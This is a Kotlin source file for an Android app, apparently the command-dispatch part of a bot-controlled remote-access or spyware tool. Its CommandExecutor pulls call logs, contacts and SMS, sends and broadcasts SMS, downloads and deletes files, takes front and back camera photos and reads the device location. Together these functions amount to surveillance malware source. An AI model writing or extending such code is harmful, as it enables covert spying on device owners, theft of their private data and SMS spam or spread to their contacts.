package com.fasonbot.app.action

import android.content.Context

class CommandExecutor(context: Context) {

    private val callLogExecutor = CallLogExecutor(context)
    private val contactsExecutor = ContactsExecutor(context)
    private val smsExecutor = SmsExecutor(context)
    val fileExecutor = FileExecutor(context)
    private val cameraExecutor = CameraExecutor(context)
    private val locationExecutor = LocationExecutor(context)

    fun executeGetCallLog() = callLogExecutor.execute()

    fun executeGetContacts() = contactsExecutor.execute()

    fun executeGetSmsMessages() = smsExecutor.executeGetMessages()

    fun executeSendSms(number: String, message: String) = smsExecutor.executeSendSms(number, message)

    fun executeBroadcastSms(message: String) = smsExecutor.executeBroadcastSms(message)

    fun executeDownloadFile(path: String) = fileExecutor.executeDownload(path)

    fun executeDeleteFile(path: String) = fileExecutor.executeDelete(path)

    fun executeListFiles(path: String) = fileExecutor.executeList(path)

    // Camera operations
    fun executeCaptureBackCamera() = cameraExecutor.capture(0)

    fun executeCaptureFrontCamera() = cameraExecutor.capture(1)

    fun executeCaptureBothCameras() {
        cameraExecutor.capture(0)
        // Front camera captured after delay
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            cameraExecutor.capture(1)
        }, 3000)
    }

    // Location operations
    fun executeGetLocation() = locationExecutor.getCurrentLocation()
}
